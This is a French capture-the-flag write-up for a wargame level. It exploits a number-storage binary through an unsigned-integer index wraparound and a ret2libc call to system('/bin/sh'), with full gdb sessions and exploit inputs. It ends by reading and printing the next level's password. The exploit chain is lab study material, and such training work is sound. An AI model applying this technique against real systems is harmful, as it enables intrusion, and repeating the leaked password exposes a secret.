En desassemblant le code que l'on ne peux pas passer de shellcode ni en arguments du programme ni en overflow le fgets.

On va donc creuser le programme !

On voit que l'on a deux fonctions qui peuvent nous interresser. 

- read - Qui demande a l'uilisateur un index a affiché sur la sortie standard
- store - Qui stock un nombre non signé dans un index bien spécifique

On voit aussi qu'il est interdis de stocker un nombre à certains index

```bash
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: read
 Index: 1
 Number at data[1] is 0
 Completed read command successfully
Input command: 1
 Failed to do 1 command
Input command: store
 Number: 123
 Index: 3
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: store
 Number: 123
 Index: 2
 Completed store command successfully
Input command: store
 Number: 123
 Index: 6
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command:
```

On va essayer de trouver un moyen de stocke une information sur un index interdis 

```gdb
(gdb) set disassembly-flavor intel
(gdb) b *main+718
Breakpoint 1 at 0x80489f1
(gdb) r
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: quit

Breakpoint 1, 0x080489f1 in main ()
(gdb) x/x $esp
0xffffd68c:	0xf7e45513
(gdb) b *main+110
Breakpoint 2 at 0x8048791
(gdb) c
Continuing.
[Inferior 1 (process 4290) exited normally]
(gdb) i b
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x080489f1 <main+718>
	breakpoint already hit 1 time
2       breakpoint     keep y   0x08048791 <main+110>
(gdb) r
Starting program: /home/users/level07/level07

Breakpoint 2, 0x08048791 in main ()
(gdb) x/x $esp
0xffffd4a0:	0x00000040
(gdb) x/x $esp+0x24
0xffffd4c4:	0x00000000
(gdb) p 0x68c - 4c4
Invalid number "4c4".
(gdb) p 0x68c - 0x4c4
$1 = 456
```
On tombe sur 456 / 4 == 114 mais avec 114 on ne peux pas écrire car 114 % 3 == 0

Vu que c'est un entier non signé on va essayer d'overflow l'unsigned pour quand même écrire aux bon index.

```bash
❯ python -c "print((0xffffffff + 1) / 4 + 114)"
1073741938 # Voilaaaa
```

Il ne reste plus qu'a récuperer les adresse de system et de "/bin/sh" pour faire un ret2libC avec des unsigned int

```gdb
(gdb) info proc map
process 4293
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0
	0xf7fda000 0xf7fdb000     0x1000        0x0
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
(gdb) info func system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
(gdb) p 0xf7e6aed0
$2 = 4159090384
(gdb) p 0xf7f897ec
$3 = 4160264172
```

On a plus qu'a inserer le tout dans le tableau et quit le programme pour être redirigé vers la fonction system

```bash
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: 4159090384
 Failed to do 4159090384 command
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
